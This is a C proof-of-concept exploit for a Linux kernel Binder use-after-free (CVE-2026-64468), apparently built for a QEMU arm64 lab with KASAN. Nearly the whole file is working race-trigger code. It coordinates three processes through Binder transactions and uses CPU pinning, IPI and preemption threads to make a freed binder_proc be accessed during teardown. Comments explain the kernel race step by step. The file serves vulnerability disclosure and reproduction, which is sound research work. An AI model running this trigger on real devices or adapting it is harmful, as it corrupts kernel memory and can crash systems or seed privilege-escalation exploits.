/*
 * Exploit Title: Linux kernel Binder binder_free_transaction() process-lifetime
 *                UAF (CVE-2026-64468) - QEMU arm64 proof of concept
 * Date: 2026-08-16
 * Exploit Author: A. Ramos <aramosf@gmail.com> (@aramosf)
 * Discovery: Alice Ryhl, Google (fix by Carlos Llamas, Google)
 * Affected: Linux kernel with CONFIG_ANDROID_BINDER_IPC, before f223d27a546c
 * Tested on: Linux 7.2.0-rc1 (114a116aaa5f), arm64, QEMU virt, KASAN_GENERIC
 * Type: Local kernel use-after-free (proof of concept, not a privilege escalation)
 * CVE: CVE-2026-64468
 *
 * Upstream fix: https://github.com/torvalds/linux/commit/f223d27a546c1e1f48d38fd67760e78f068fe8c4
 * Original report: https://lore.kernel.org/all/aikJKVuny_eOivwN@google.com/
 *
 * Android BinderFS lab adaptation: BINDER_DEVICE selects an isolated device.
 * Based on A. Ramos PoC at commit c3a1bcf9a00b804b50d0ddff145fff2bc2ace767.
 * SPDX-License-Identifier: GPL-2.0
 */

/*
 * What this triggers
 * ------------------
 * In this Android r7 build, binder_free_transaction() reads t->to_proc and
 * then acquires that process' inner lock without pinning the process:
 *
 *      target_proc = t->to_proc;
 *      if (target_proc)
 *              binder_inner_proc_lock(target_proc);   <-- use after free
 *
 * Nothing keeps target_proc alive across that gap, so a process that is being
 * torn down in parallel can be kfree()d in between. Android commit
 * 3fc92ed75e44 pins t->to_thread, which keeps the owning process alive.
 *
 * Reaching the vulnerable access requires binder_send_failed_reply() to walk
 * from a transaction whose sender thread is gone to its from_parent, whose
 * receiving process is still alive.  binder_transaction()'s "bad transaction
 * stack" guard forces every from_parent link to be the incoming transaction of
 * the very thread that sent the child, so both
 *
 *      child->from     = NULL
 *      parent->to_proc = NULL
 *
 * are written by adjacent iterations of one binder_thread_release() walk, each
 * under the respective t->lock.  The walker can only observe a live foreign
 * target_proc if it takes parent->lock in the short gap between that walk's
 * spin_unlock(&child->lock) and spin_lock(&parent->lock).
 *
 * The topology below is the shortest chain that reaches the access, so the
 * walker's work inside that gap is minimal - two t->lock acquisitions and one
 * kfree(), with no foreign inner_proc_lock, no wake_up and no reply delivery:
 *
 *   B thread i   --e2 (sync, code 0x4442414b)-->  P thread Y_i
 *   P thread Y_i --e1 (sync, code 0x54414c4c)-->  B thread i   (nested target)
 *
 *   B thread i  stack: [ e2 outgoing , e1 incoming (top) ]
 *   P thread Y_i stack: [ e2 incoming , e1 outgoing (top) ]
 *
 * P then drops its binder fd, so binder_deferred_release() releases Y_1..Y_K
 * and finally kfree()s the binder_proc, while every B thread concurrently
 * issues BINDER_THREAD_EXIT:
 *
 *   binder_thread_release(B_i)     nulls e1->to_proc (own proc) and e2->from
 *   binder_send_failed_reply(e1)   e1->from == NULL once Y_i was released
 *     -> binder_free_transaction(e1)  target_proc already NULL, kfree(e1)
 *     -> binder_free_transaction(e2)  target_proc == P   <-- vulnerable access
 *
 * The race process needs no kernel change or scheduler hook. Android setup
 * uses root to create a separate BinderFS device and context manager; the
 * process then runs against that device. Detection is left to the kernel:
 * KASAN reports the use-after-free. Binder may also print
 * "Unexpected outstanding_txns -1" when the walker and
 * binder_thread_release() both decrement the same live counter; that warning
 * alone does not establish a use-after-free.
 *
 * Both ordering conditions are narrow, so this remains a probabilistic race.
 *
 * usage: binder_chain_64468 <seconds> <threads> <stagger_us> <p_delay_us>
 *                           <worker_cpu> <irq_us> <b_cpu_base>
 *                           [b_delay_max_us] [b_delay_step_us]
 *                           [preempt_period_us] [preempt_hold_us]
 *
 * run.sh and verify.sh drive it with the validated parameters; the defaults
 * are safe to use directly.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <linux/android/binder.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define BINDER_MAP_SIZE (128U * 1024U)
#define MAX_THREADS 128U

/*
 * CODE_PARENT marks the transaction whose to_proc is dereferenced after
 * t->lock is dropped; CODE_CHILD marks the one the walker frees first.  The
 * values are arbitrary, they only have to be distinct.
 */
#define CODE_PARENT 0x4442414bU
#define CODE_CHILD 0x54414c4cU
#define CODE_REGISTER_P 0x52454750U
#define CODE_REGISTER_B 0x52454742U
#define CODE_SEND_P 0x53454e50U
#define CODE_SEND_B 0x53454e42U

struct endpoint {
	int fd;
	void *mapping;
};

struct control {
	volatile unsigned int go;
	volatile unsigned int b_armed;
	volatile unsigned int p_armed;
	volatile unsigned int b_done;
	volatile unsigned int p_done;
	volatile unsigned int walked;
	volatile unsigned int stopped_live;
	volatile unsigned int setup_failures;
	volatile unsigned int b_delay_us;
	volatile unsigned int quit;
};

static struct control *ctl;
static unsigned int cfg_threads = 32U;
static unsigned int cfg_stagger_us;
static unsigned int cfg_p_delay_us;
static unsigned int cfg_worker_cpu;
static unsigned int cfg_irq_us;
static unsigned int cfg_b_cpu_base = 1U;
static unsigned int cfg_cpus = 1U;
static unsigned int cfg_b_delay_max_us;
static unsigned int cfg_b_delay_step_us = 25U;
static unsigned int cfg_preempt_period_us;
static unsigned int cfg_preempt_hold_us;

static void set_task_name(const char *name)
{
	(void)prctl(PR_SET_NAME, name, 0, 0, 0);
}

static uint64_t monotonic_ns(void)
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts) < 0)
		return 0;
	return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

static double monotonic_seconds(void)
{
	return (double)monotonic_ns() / 1000000000.0;
}

/*
 * Spin hint.  The tight waits below are deliberately busy: the whole point is
 * to be running when the kernel side reaches the window, so yielding would
 * defeat the harness.
 */
static inline void cpu_relax_hint(void)
{
#if defined(__aarch64__) || defined(__arm__)
	__asm__ volatile("yield" ::: "memory");
#elif defined(__x86_64__) || defined(__i386__)
	__asm__ volatile("pause" ::: "memory");
#else
	__asm__ volatile("" ::: "memory");
#endif
}

static void busy_wait_us(unsigned int microseconds)
{
	uint64_t deadline;

	if (!microseconds)
		return;
	deadline = monotonic_ns() + (uint64_t)microseconds * 1000ULL;
	while (monotonic_ns() < deadline)
		cpu_relax_hint();
}

static int pin_to_cpu(unsigned int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

/*
 * binder_thread_release() walks the transaction stack with proc->inner_lock
 * held, so it cannot be preempted; only an interrupt can stall it between
 * spin_unlock(&child->lock) and spin_lock(&parent->lock).  Waking a task that
 * is pinned to the release CPU from another CPU makes the scheduler send a
 * reschedule IPI there, which lands even while a kworker is running.
 */
static unsigned int ipi_word;

static void *ipi_anchor_thread(void *opaque)
{
	(void)opaque;
	set_task_name("cve64468-anch");
	(void)pin_to_cpu(cfg_worker_cpu);
	while (!__atomic_load_n(&ctl->quit, __ATOMIC_RELAXED))
		(void)syscall(SYS_futex, &ipi_word, FUTEX_WAIT_PRIVATE, 0U,
			      NULL, NULL, 0);
	return NULL;
}

static void *ipi_pinger_thread(void *opaque)
{
	(void)opaque;
	set_task_name("cve64468-ping");
	if (cfg_cpus > 1U)
		(void)pin_to_cpu(cfg_cpus - 1U);
	while (!__atomic_load_n(&ctl->quit, __ATOMIC_RELAXED)) {
		(void)syscall(SYS_futex, &ipi_word, FUTEX_WAKE_PRIVATE, 1,
			      NULL, NULL, 0);
		if (cfg_irq_us > 1U)
			busy_wait_us(cfg_irq_us - 1U);
	}
	return NULL;
}

/*
 * Condition (F): after the snapshot the walker must lose its CPU before
 * binder_inner_proc_lock() and stay off it until the deferred worker has
 * finished the teardown.  One sleeper per walker CPU supplies both halves: its
 * timer interrupt lands on that CPU, and the wakeup preempts the walker for
 * however long the sleeper then burns.
 */
static void *walker_preemptor_thread(void *opaque)
{
	unsigned int cpu = (unsigned int)(uintptr_t)opaque;
	struct timespec period;

	set_task_name("cve64468-pre");
	(void)pin_to_cpu(cpu);
	period.tv_sec = 0;
	period.tv_nsec = (long)cfg_preempt_period_us * 1000L;
	while (!__atomic_load_n(&ctl->quit, __ATOMIC_RELAXED)) {
		(void)nanosleep(&period, NULL);
		busy_wait_us(cfg_preempt_hold_us);
	}
	return NULL;
}

static int open_endpoint(struct endpoint *endpoint)
{
	const char *binder_device = getenv("BINDER_DEVICE");
	if (!binder_device || !*binder_device)
		binder_device = "/dev/binder";
	endpoint->fd = open(binder_device, O_RDWR | O_CLOEXEC);
	if (endpoint->fd < 0)
		return -1;
	endpoint->mapping = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE,
				 endpoint->fd, 0);
	if (endpoint->mapping == MAP_FAILED) {
		(void)close(endpoint->fd);
		endpoint->fd = -1;
		return -1;
	}
	return 0;
}

static int write_transaction(int fd, uint32_t handle, uint32_t code,
			     uint32_t flags, const void *data, size_t data_size,
			     const binder_size_t *offsets, size_t offsets_size)
{
	struct {
		uint32_t command;
		struct binder_transaction_data transaction;
	} __attribute__((packed)) packet;
	struct binder_write_read bwr;

	memset(&packet, 0, sizeof(packet));
	packet.command = BC_TRANSACTION;
	packet.transaction.target.handle = handle;
	packet.transaction.code = code;
	packet.transaction.flags = flags;
	packet.transaction.data_size = data_size;
	packet.transaction.offsets_size = offsets_size;
	packet.transaction.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)data;
	packet.transaction.data.ptr.offsets =
		(binder_uintptr_t)(uintptr_t)offsets;
	memset(&bwr, 0, sizeof(bwr));
	bwr.write_size = sizeof(packet);
	bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
	if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
		return -1;
	return bwr.write_consumed == sizeof(packet) ? 0 : -1;
}

static int handle_command(int fd, uint32_t command, uint32_t handle)
{
	struct {
		uint32_t command;
		uint32_t handle;
	} __attribute__((packed)) packet;
	struct binder_write_read bwr;

	packet.command = command;
	packet.handle = handle;
	memset(&bwr, 0, sizeof(bwr));
	bwr.write_size = sizeof(packet);
	bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
	if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
		return -1;
	return bwr.write_consumed == sizeof(packet) ? 0 : -1;
}

static int free_buffer(int fd, binder_uintptr_t user_buffer)
{
	struct {
		uint32_t command;
		binder_uintptr_t buffer;
	} __attribute__((packed)) packet;
	struct binder_write_read bwr;

	packet.command = BC_FREE_BUFFER;
	packet.buffer = user_buffer;
	memset(&bwr, 0, sizeof(bwr));
	bwr.write_size = sizeof(packet);
	bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&packet;
	if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
		return -1;
	return bwr.write_consumed == sizeof(packet) ? 0 : -1;
}

/*
 * A thread only receives work queued on proc->todo once it is flagged as a
 * looper (binder_available_for_proc_work_ilocked).  Thread-directed work does
 * not need this, so the walker workers deliberately stay unflagged and cannot
 * steal the broker messages aimed at their main thread.
 */
static int enter_looper(int fd)
{
	uint32_t command = BC_ENTER_LOOPER;
	struct binder_write_read bwr;

	memset(&bwr, 0, sizeof(bwr));
	bwr.write_size = sizeof(command);
	bwr.write_buffer = (binder_uintptr_t)(uintptr_t)&command;
	if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
		return -1;
	return bwr.write_consumed == sizeof(command) ? 0 : -1;
}

/* Payload size of a BR_ command, so the reply stream is parsed exactly. */
static ssize_t return_payload_size(uint32_t command)
{
	switch (command) {
	case BR_ERROR:
		return (ssize_t)sizeof(uint32_t);
	case BR_TRANSACTION:
	case BR_REPLY:
		return (ssize_t)sizeof(struct binder_transaction_data);
	case BR_TRANSACTION_SEC_CTX:
		return (ssize_t)sizeof(struct binder_transaction_data_secctx);
	case BR_ACQUIRE_RESULT:
		return (ssize_t)sizeof(uint32_t);
	case BR_INCREFS:
	case BR_ACQUIRE:
	case BR_RELEASE:
	case BR_DECREFS:
		return (ssize_t)(2 * sizeof(binder_uintptr_t));
	case BR_DEAD_BINDER:
	case BR_CLEAR_DEATH_NOTIFICATION_DONE:
		return (ssize_t)sizeof(binder_uintptr_t);
	case BR_OK:
	case BR_NOOP:
	case BR_TRANSACTION_COMPLETE:
	case BR_SPAWN_LOOPER:
	case BR_DEAD_REPLY:
	case BR_FAILED_REPLY:
	case BR_FROZEN_REPLY:
	case BR_TRANSACTION_PENDING_FROZEN:
	case BR_ONEWAY_SPAM_SUSPECT:
		return 0;
	default:
		return -1;
	}
}

/*
 * Reads until a BR_TRANSACTION carrying @expected_code is seen.  Returns 0 on
 * success, -1 on error, -2 when the stream ended without the wanted code.
 */
static int read_transaction(int fd, uint32_t expected_code,
			    struct binder_transaction_data *transaction,
			    unsigned int attempts)
{
	unsigned char buffer[8192];
	unsigned int round;

	for (round = 0; round < attempts; round++) {
		struct binder_write_read bwr;
		size_t offset = 0;

		memset(&bwr, 0, sizeof(bwr));
		bwr.read_size = sizeof(buffer);
		bwr.read_buffer = (binder_uintptr_t)(uintptr_t)buffer;
		if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0) {
			if (errno == EINTR)
				continue;
			return -1;
		}
		while (offset + sizeof(uint32_t) <= bwr.read_consumed) {
			uint32_t command;
			ssize_t payload;

			memcpy(&command, buffer + offset, sizeof(command));
			offset += sizeof(command);
			payload = return_payload_size(command);
			if (payload < 0)
				return -1;
			if (offset + (size_t)payload > bwr.read_consumed)
				return -1;
			if (command == BR_TRANSACTION) {
				memcpy(transaction, buffer + offset,
				       sizeof(*transaction));
				if (transaction->code == expected_code)
					return 0;
			}
			offset += (size_t)payload;
		}
	}
	return -2;
}

/* Consume any pending return commands without blocking. */
static void drain_endpoint(int fd)
{
	unsigned char buffer[8192];
	unsigned int round;

	struct pollfd pollfd = {.fd = fd, .events = POLLIN};

	/*
	 * binder_thread_read() sleeps unless there is work, and asking for it
	 * with O_NONBLOCK makes binder_ioctl() log every -EAGAIN.  Poll first
	 * so the drain only reads when something is actually queued.
	 */
	for (round = 0; round < 8U; round++) {
		if (poll(&pollfd, 1, 0) <= 0)
			break;
		struct binder_write_read bwr;
		size_t offset = 0;

		memset(&bwr, 0, sizeof(bwr));
		bwr.read_size = sizeof(buffer);
		bwr.read_buffer = (binder_uintptr_t)(uintptr_t)buffer;
		if (ioctl(fd, BINDER_WRITE_READ, &bwr) < 0)
			break;
		if (!bwr.read_consumed)
			break;
		while (offset + sizeof(uint32_t) <= bwr.read_consumed) {
			uint32_t command;
			ssize_t payload;

			memcpy(&command, buffer + offset, sizeof(command));
			offset += sizeof(command);
			payload = return_payload_size(command);
			if (payload < 0)
				break;
			offset += (size_t)payload;
		}
	}
}

static void send_status(int fd, char status)
{
	ssize_t written = write(fd, &status, 1);

	(void)written;
}

static int read_status(int fd, char *status)
{
	return read(fd, status, 1) == 1 ? 0 : -1;
}

/* ------------------------------------------------------------------ */
/* manager: context manager and handle broker                          */
/* ------------------------------------------------------------------ */

static void manager_process(int status_fd, int control_fd)
{
	struct binder_transaction_data transaction;
	struct flat_binder_object object;
	binder_size_t object_offset = 0;
	struct endpoint endpoint;
	uint32_t walker_handle = 0;
	uint32_t victim_handle = 0;
	uint32_t previous_victim_handle = 0;
	int have_walker = 0;
	int manager = 0;
	char command;

	set_task_name("cve64468-M");
	if (pin_to_cpu(cfg_cpus - 1U) < 0) {
		send_status(status_fd, 'F');
		_exit(1);
	}
	if (open_endpoint(&endpoint) < 0) {
		send_status(status_fd, 'O');
		_exit(1);
	}
	if (ioctl(endpoint.fd, BINDER_SET_CONTEXT_MGR, &manager) < 0) {
		send_status(status_fd, 'M');
		_exit(1);
	}
	if (enter_looper(endpoint.fd) < 0) {
		send_status(status_fd, 'L');
		_exit(1);
	}
	send_status(status_fd, 'R');

	for (;;) {
		if (read_status(control_fd, &command) < 0)
			_exit(0);
		if (command == 'q')
			_exit(0);

		/* The walker registers once; the victim registers per attempt. */
		if (!have_walker) {
			if (read_transaction(endpoint.fd, CODE_REGISTER_B,
					     &transaction, 4096U) < 0) {
				send_status(status_fd, 'b');
				_exit(2);
			}
			memcpy(&object,
			       (void *)(uintptr_t)transaction.data.ptr.buffer,
			       sizeof(object));
			if (object.hdr.type != BINDER_TYPE_HANDLE) {
				send_status(status_fd, 'h');
				_exit(2);
			}
			walker_handle = object.handle;
			if (handle_command(endpoint.fd, BC_ACQUIRE,
					   walker_handle) < 0 ||
			    free_buffer(endpoint.fd,
					transaction.data.ptr.buffer) < 0) {
				send_status(status_fd, 'a');
				_exit(2);
			}
			have_walker = 1;
		}

		if (read_transaction(endpoint.fd, CODE_REGISTER_P, &transaction,
				     4096U) < 0) {
			send_status(status_fd, 'p');
			_exit(2);
		}
		memcpy(&object, (void *)(uintptr_t)transaction.data.ptr.buffer,
		       sizeof(object));
		if (object.hdr.type != BINDER_TYPE_HANDLE) {
			send_status(status_fd, 'h');
			_exit(2);
		}
		victim_handle = object.handle;
		if (handle_command(endpoint.fd, BC_ACQUIRE, victim_handle) < 0 ||
		    free_buffer(endpoint.fd, transaction.data.ptr.buffer) < 0) {
			send_status(status_fd, 'a');
			_exit(2);
		}

		memset(&object, 0, sizeof(object));
		object.hdr.type = BINDER_TYPE_HANDLE;
		object.handle = victim_handle;
		if (write_transaction(endpoint.fd, walker_handle, CODE_SEND_P,
				      TF_ONE_WAY, &object, sizeof(object),
				      &object_offset,
				      sizeof(object_offset)) < 0) {
			send_status(status_fd, 'w');
			_exit(2);
		}
		memset(&object, 0, sizeof(object));
		object.hdr.type = BINDER_TYPE_HANDLE;
		object.handle = walker_handle;
		if (write_transaction(endpoint.fd, victim_handle, CODE_SEND_B,
				      TF_ONE_WAY, &object, sizeof(object),
				      &object_offset,
				      sizeof(object_offset)) < 0) {
			send_status(status_fd, 'w');
			_exit(2);
		}
		if (previous_victim_handle)
			(void)handle_command(endpoint.fd, BC_RELEASE,
					     previous_victim_handle);
		previous_victim_handle = victim_handle;
		drain_endpoint(endpoint.fd);
		send_status(status_fd, 's');
	}
}

/* ------------------------------------------------------------------ */
/* walker (B): owns the transaction stacks that get walked             */
/* ------------------------------------------------------------------ */

/*
 * Round handoff between a main thread and its workers.  This has to block
 * rather than spin: the lab runs under TCG with more harness threads than
 * emulated CPUs, so sched_yield() loops would starve the binder work itself.
 */
struct round {
	pthread_mutex_t lock;
	pthread_cond_t change;
	unsigned int generation;
	unsigned int finished;
	unsigned int quit;
};

static void round_init(struct round *round)
{
	(void)pthread_mutex_init(&round->lock, NULL);
	(void)pthread_cond_init(&round->change, NULL);
	round->generation = 0;
	round->finished = 0;
	round->quit = 0;
}

static void round_start(struct round *round)
{
	(void)pthread_mutex_lock(&round->lock);
	round->finished = 0;
	round->generation++;
	(void)pthread_cond_broadcast(&round->change);
	(void)pthread_mutex_unlock(&round->lock);
}

static void round_stop(struct round *round)
{
	(void)pthread_mutex_lock(&round->lock);
	round->quit = 1;
	round->generation++;
	(void)pthread_cond_broadcast(&round->change);
	(void)pthread_mutex_unlock(&round->lock);
}

/* Returns 0 when a new round started, -1 when the harness is shutting down. */
static int round_wait(struct round *round, unsigned int *seen)
{
	(void)pthread_mutex_lock(&round->lock);
	while (round->generation == *seen && !round->quit)
		(void)pthread_cond_wait(&round->change, &round->lock);
	*seen = round->generation;
	if (round->quit) {
		(void)pthread_mutex_unlock(&round->lock);
		return -1;
	}
	(void)pthread_mutex_unlock(&round->lock);
	return 0;
}

static void round_finish(struct round *round)
{
	(void)pthread_mutex_lock(&round->lock);
	round->finished++;
	(void)pthread_cond_broadcast(&round->change);
	(void)pthread_mutex_unlock(&round->lock);
}

static void round_join(struct round *round, unsigned int target)
{
	(void)pthread_mutex_lock(&round->lock);
	while (round->finished < target && !round->quit)
		(void)pthread_cond_wait(&round->change, &round->lock);
	(void)pthread_mutex_unlock(&round->lock);
}

struct walker_state {
	int fd;
	uint32_t victim_handle;
	struct round round;
};

static struct walker_state walker;

static void *walker_thread(void *opaque)
{
	unsigned int index = (unsigned int)(uintptr_t)opaque;
	unsigned int seen = 0;

	set_task_name("cve64468-B");
	if (cfg_cpus > cfg_b_cpu_base)
		(void)pin_to_cpu(cfg_b_cpu_base +
				 index % (cfg_cpus - cfg_b_cpu_base));

	for (;;) {
		struct binder_transaction_data transaction;
		int armed = 0;

		if (round_wait(&walker.round, &seen) < 0)
			return NULL;

		/* e2: B -> P, the transaction whose to_proc is observed. */
		if (write_transaction(walker.fd, walker.victim_handle,
				      CODE_PARENT, 0, NULL, 0, NULL, 0) == 0 &&
		    read_transaction(walker.fd, CODE_CHILD, &transaction,
				     4096U) == 0) {
			(void)free_buffer(walker.fd,
					  transaction.data.ptr.buffer);
			armed = 1;
		} else {
			__atomic_fetch_add(&ctl->setup_failures, 1U,
					   __ATOMIC_RELAXED);
		}

		__atomic_fetch_add(&ctl->b_armed, 1U, __ATOMIC_RELEASE);
		while (!__atomic_load_n(&ctl->go, __ATOMIC_ACQUIRE)) {
			if (__atomic_load_n(&ctl->quit, __ATOMIC_RELAXED))
				return NULL;
			cpu_relax_hint();
		}
		busy_wait_us(__atomic_load_n(&ctl->b_delay_us, __ATOMIC_RELAXED) +
			     index * cfg_stagger_us);
		if (armed) {
			(void)ioctl(walker.fd, BINDER_THREAD_EXIT, 0);
			__atomic_fetch_add(&ctl->walked, 1U, __ATOMIC_RELAXED);
		}
		__atomic_fetch_add(&ctl->b_done, 1U, __ATOMIC_RELEASE);
		round_finish(&walker.round);
	}
}

static void walker_process(int status_fd, int control_fd)
{
	struct binder_transaction_data transaction;
	struct flat_binder_object object;
	binder_size_t object_offset = 0;
	struct endpoint endpoint;
	pthread_t threads[MAX_THREADS];
	unsigned int index;
	uint32_t previous_handle = 0;
	char command;

	set_task_name("cve64468-B");
	if (open_endpoint(&endpoint) < 0) {
		send_status(status_fd, 'O');
		_exit(1);
	}
	walker.fd = endpoint.fd;
	round_init(&walker.round);
	if (enter_looper(endpoint.fd) < 0) {
		send_status(status_fd, 'L');
		_exit(1);
	}

	memset(&object, 0, sizeof(object));
	object.hdr.type = BINDER_TYPE_BINDER;
	object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
	object.binder = 0x4242424200000001ULL;
	object.cookie = 0x4242424200000002ULL;
	if (write_transaction(endpoint.fd, 0, CODE_REGISTER_B, TF_ONE_WAY,
			      &object, sizeof(object), &object_offset,
			      sizeof(object_offset)) < 0) {
		send_status(status_fd, 'w');
		_exit(1);
	}
	for (index = 0; index < cfg_threads; index++) {
		if (pthread_create(&threads[index], NULL, walker_thread,
				   (void *)(uintptr_t)index) != 0) {
			send_status(status_fd, 'T');
			_exit(1);
		}
	}
	send_status(status_fd, 'R');

	for (;;) {
		if (read_status(control_fd, &command) < 0 || command == 'q') {
			__atomic_store_n(&ctl->quit, 1U, __ATOMIC_RELEASE);
			round_stop(&walker.round);
			for (index = 0; index < cfg_threads; index++)
				(void)pthread_join(threads[index], NULL);
			_exit(0);
		}
		if (read_transaction(endpoint.fd, CODE_SEND_P, &transaction,
				     4096U) < 0) {
			send_status(status_fd, 'g');
			continue;
		}
		memcpy(&object, (void *)(uintptr_t)transaction.data.ptr.buffer,
		       sizeof(object));
		if (object.hdr.type != BINDER_TYPE_HANDLE) {
			send_status(status_fd, 'h');
			continue;
		}
		walker.victim_handle = object.handle;
		if (handle_command(endpoint.fd, BC_ACQUIRE,
				   walker.victim_handle) < 0 ||
		    free_buffer(endpoint.fd, transaction.data.ptr.buffer) < 0) {
			send_status(status_fd, 'a');
			continue;
		}

		round_start(&walker.round);
		send_status(status_fd, 's');
		round_join(&walker.round, cfg_threads);

		if (previous_handle)
			(void)handle_command(endpoint.fd, BC_RELEASE,
					     previous_handle);
		previous_handle = walker.victim_handle;
		drain_endpoint(endpoint.fd);
		send_status(status_fd, 'd');
	}
}

/* ------------------------------------------------------------------ */
/* victim (P): its binder_proc is the object that must be freed        */
/* ------------------------------------------------------------------ */

struct victim_state {
	int fd;
	uint32_t walker_handle;
	struct round round;
};

static struct victim_state victim;

static void *victim_thread(void *opaque)
{
	unsigned int index = (unsigned int)(uintptr_t)opaque;
	unsigned int seen = 0;
	char name[16];

	(void)snprintf(name, sizeof(name), "cve64468-Y%u", index % 100U);
	set_task_name(name);
	if (cfg_cpus > cfg_b_cpu_base)
		(void)pin_to_cpu(cfg_b_cpu_base +
				 index % (cfg_cpus - cfg_b_cpu_base));

	for (;;) {
		struct binder_transaction_data transaction;

		if (round_wait(&victim.round, &seen) < 0)
			return NULL;

		/*
		 * Receive e2 and, while it is this thread's stack top, send e1
		 * back.  binder_transaction() resolves the nested target thread
		 * from e2->from, so e1 lands on the same walker thread.
		 *
		 * The binder_thread is new on every attempt because the victim
		 * reopens /dev/binder, so the looper flag has to be set again.
		 */
		if (enter_looper(victim.fd) < 0)
			__atomic_fetch_add(&ctl->setup_failures, 1U,
					   __ATOMIC_RELAXED);
		if (read_transaction(victim.fd, CODE_PARENT, &transaction,
				     4096U) == 0) {
			if (write_transaction(victim.fd, victim.walker_handle,
					      CODE_CHILD, 0, NULL, 0, NULL,
					      0) < 0)
				__atomic_fetch_add(&ctl->setup_failures, 1U,
						   __ATOMIC_RELAXED);
		} else {
			__atomic_fetch_add(&ctl->setup_failures, 1U,
					   __ATOMIC_RELAXED);
		}
		__atomic_fetch_add(&ctl->p_armed, 1U, __ATOMIC_RELEASE);
		round_finish(&victim.round);
	}
}

static void victim_process(int status_fd, int control_fd)
{
	struct binder_transaction_data transaction;
	struct flat_binder_object object;
	binder_size_t object_offset = 0;
	struct endpoint endpoint;
	pthread_t threads[MAX_THREADS];
	unsigned int index;
	char command;

	set_task_name("cve64468-P");
	if (pin_to_cpu(cfg_worker_cpu) < 0) {
		send_status(status_fd, 'F');
		_exit(1);
	}
	round_init(&victim.round);
	if (cfg_preempt_hold_us) {
		unsigned int cpu;

		for (cpu = cfg_b_cpu_base; cpu < cfg_cpus; cpu++) {
			pthread_t preemptor;

			if (pthread_create(&preemptor, NULL,
					   walker_preemptor_thread,
					   (void *)(uintptr_t)cpu) != 0) {
				send_status(status_fd, 'T');
				_exit(1);
			}
			(void)pthread_detach(preemptor);
		}
	}
	if (cfg_irq_us) {
		pthread_t anchor;
		pthread_t pinger;

		if (pthread_create(&anchor, NULL, ipi_anchor_thread, NULL) != 0 ||
		    pthread_create(&pinger, NULL, ipi_pinger_thread, NULL) != 0) {
			send_status(status_fd, 'T');
			_exit(1);
		}
		(void)pthread_detach(anchor);
		(void)pthread_detach(pinger);
	}
	for (index = 0; index < cfg_threads; index++) {
		if (pthread_create(&threads[index], NULL, victim_thread,
				   (void *)(uintptr_t)index) != 0) {
			send_status(status_fd, 'T');
			_exit(1);
		}
	}
	send_status(status_fd, 'R');

	for (;;) {
		if (read_status(control_fd, &command) < 0 || command == 'q') {
			__atomic_store_n(&ctl->quit, 1U, __ATOMIC_RELEASE);
			round_stop(&victim.round);
			for (index = 0; index < cfg_threads; index++)
				(void)pthread_join(threads[index], NULL);
			_exit(0);
		}

		if (open_endpoint(&endpoint) < 0) {
			send_status(status_fd, 'O');
			continue;
		}
		victim.fd = endpoint.fd;
		if (enter_looper(endpoint.fd) < 0) {
			send_status(status_fd, 'L');
			(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
			(void)close(endpoint.fd);
			continue;
		}

		memset(&object, 0, sizeof(object));
		object.hdr.type = BINDER_TYPE_BINDER;
		object.flags = FLAT_BINDER_FLAG_ACCEPTS_FDS;
		object.binder = 0x5050505000000001ULL;
		object.cookie = 0x5050505000000002ULL;
		if (write_transaction(endpoint.fd, 0, CODE_REGISTER_P,
				      TF_ONE_WAY, &object, sizeof(object),
				      &object_offset,
				      sizeof(object_offset)) < 0) {
			send_status(status_fd, 'w');
			(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
			(void)close(endpoint.fd);
			continue;
		}
		if (read_transaction(endpoint.fd, CODE_SEND_B, &transaction,
				     4096U) < 0) {
			send_status(status_fd, 'g');
			(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
			(void)close(endpoint.fd);
			continue;
		}
		memcpy(&object, (void *)(uintptr_t)transaction.data.ptr.buffer,
		       sizeof(object));
		if (object.hdr.type != BINDER_TYPE_HANDLE) {
			send_status(status_fd, 'h');
			(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
			(void)close(endpoint.fd);
			continue;
		}
		victim.walker_handle = object.handle;
		if (handle_command(endpoint.fd, BC_ACQUIRE,
				   victim.walker_handle) < 0 ||
		    free_buffer(endpoint.fd, transaction.data.ptr.buffer) < 0) {
			send_status(status_fd, 'a');
			(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
			(void)close(endpoint.fd);
			continue;
		}

		round_start(&victim.round);
		send_status(status_fd, 's');
		round_join(&victim.round, cfg_threads);

		/*
		 * Drop the mapping while still setting up.  binder_vma_close()
		 * only clears alloc->vma; the delivered buffers survive, and it
		 * leaves close() as the single fast syscall that starts the
		 * deferred release.
		 */
		(void)munmap(endpoint.mapping, BINDER_MAP_SIZE);
		endpoint.mapping = NULL;

		while (!__atomic_load_n(&ctl->go, __ATOMIC_ACQUIRE)) {
			if (__atomic_load_n(&ctl->quit, __ATOMIC_RELAXED))
				_exit(0);
			cpu_relax_hint();
		}
		if (cfg_p_delay_us)
			busy_wait_us(cfg_p_delay_us);
		/*
		 * The mapping already went away, so this drops the last struct
		 * file reference.  binder_release() then queues the deferred
		 * work on this CPU, which is where the release runs.
		 */
		(void)close(endpoint.fd);
		victim.fd = -1;
		__atomic_store_n(&ctl->p_done, 1U, __ATOMIC_RELEASE);
		send_status(status_fd, 'd');
	}
}

